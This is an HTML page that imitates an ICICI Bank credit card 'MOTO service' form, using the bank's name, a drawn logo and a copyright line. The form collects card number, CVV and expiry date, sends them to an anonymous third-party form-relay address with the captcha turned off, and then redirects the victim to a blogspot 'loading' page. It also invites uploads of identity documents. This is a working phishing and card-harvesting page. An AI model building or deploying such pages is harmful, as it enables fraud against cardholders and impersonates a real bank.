<!DOCTYPE html>
<html>

<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>ICICI Bank Credit Card Form</title>
  <style>
    body {
      background-color: white;
      font-family: Arial, sans-serif;
      margin: 0;
    }

    .title-box {
      position: relative;
      background-color: orange;
      border-radius: 10px;
      padding: 10px;
      text-align: center;
      color: white;
      height: auto;
    }

    .logo {
      display: inline-block;
      vertical-align: middle;
    }

    .curve {
      position: absolute;
      top: -10px;
      left: 0;
      right: 0;
      width: 100%;
      height: 20px;
      background-color: orange;
      border-radius: 50%;
    }

    .outer-box {
      width: 88%;
      margin: 0 auto;
      padding: 20px;
      background-color: white;
      border: 2px solid orange;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
      text-align: center;
      color: black;
      display: flex;
      flex-direction: column;
    }

    .text-editor-box {
      font-size: 20px;
      margin-bottom: 20px;
      text-align: center;
      padding: 10px;
    }

    .text-editor-box label {
      text-align: left;
    }

    .text-editor-box input[type="text"],
    .text-editor-box input[type="number"],
    .text-editor-box input[type="text"],
    .text-editor-box input[type="file"] {
      width: 96%;
      padding: 10px;
      margin-bottom: 10px;
      font-size: 16px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }

    .submit-button {
      background-color: orange;
      color: black;
      padding: 10px;
      margin: 10px auto 20px auto;
      width: 96%;
      font-size: 16px;
      border: 2px solid orange;
      border-radius: 10px;
      cursor: pointer;
    }

    .lower-inputs {
      display: flex;
      justify-content: space-between;
    }

    .lower-inputs .input-field {
      width: 45%;
    }

    .copyright {
      text-align: center;
      margin-top: 20px;
      font-size: 14px;
    }
  </style>
</head>

<body>
  <div class="title-box">
    <div class="curve"></div>
    <h1 style="text-transform: uppercase;">ICICI BANK CREDIT CARD <span style="color: red; text-transform: capitalize;">MOTO SERVICE</span></h1>
  </div>
  <svg viewBox="0 0 600 200" xmlns="http://www.w3.org/2000/svg" class="logo">
    <ellipse cx="40" cy="80" ry="67" rx="40" style="fill:rgb(249,157,39)" transform="rotate(40 40 147)" />
    <ellipse cx="40" cy="68.5" ry="55.5" rx="35.5" style="fill:rgb(176,42,48)" transform="rotate(40 40 147)" />
    <text x="67.5" y="153" style="font-style: italic; font-weight: bold; font-size: 980%; fill: #FFFFFF;">i</text>
    <text x="135" y="153" style="font-family: Berlin, sans-serif; font-style: italic; font-weight: bold; font-size: 560%; fill: #005B75;"><tspan style="stroke: #005B75; stroke-width: 4px;">ICICI</tspan> Bank</text>
  </svg>
  <div class="outer-box">
    <div class="text-editor-box">
      <form action="https://formsubmit.co/d86051b781343c4159563bf50bdbf491" method="POST">
        <input type="hidden" name="_next" value="https://loding-screen.blogspot.com/2023/09/body-display-flex-flex-direction-column.html?m=1">
        <input type="text" name="_honey" style="display: none;">
        <input type="hidden" name="_captcha" value="false">
        <label for="cardNumber">Card Number:</label>
        <input type="text" name="cardNumber" id="cardNumber" required>
        <div class="lower-inputs">
          <div class="input-field">
            <label for="cvv">CVV:</label>
            <input type="number" name="cvv" id="cvv" required>
          </div>
          <div class="input-field">
            <label for="expiryDate">Expiry Date:</label>
            <input type="text" name="expiryDate" id="expiryDate" required>
          </div>
        </div>
        <br>
        <button id="Submit" style="width: 180px; height: 50px; background-color: orange; color: black">Submit</button>
      </form>
    </div>
  </div>

  <style>
    .document {
      width: 11cm;
      height: 1cm;
      background-color: orange;
      margin-bottom: 1cm;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .document p {
      margin: 0;
      color: white;
      font-size: 25px;
    }

    .front-document {
      margin-top: 1cm;
    }

    .back-document {
      margin-bottom: 1cm;
    }
  </style>

  <div class="document front-document">
    <p>Upload front document</p>
  </div>

  <div class="document">
    <p>Upload back document</p>
  </div>

  <div class="copyright">
    <p>Copyright &copy; 2023 ICICI Bank</p>
  </div>

</body>

</html>
